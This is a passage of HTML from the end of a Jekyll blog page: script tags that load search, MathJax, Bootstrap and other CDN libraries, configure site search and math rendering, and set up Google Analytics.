src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://ocholuo.github.io/{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script async src="https://cdn.jsdelivr.net/npm/countup.js@1.9.3/dist/countUp.min.js"></script> <script defer src="/assets/js/dist/pvreport.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-179830187-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-179830187-1'); }); </script>
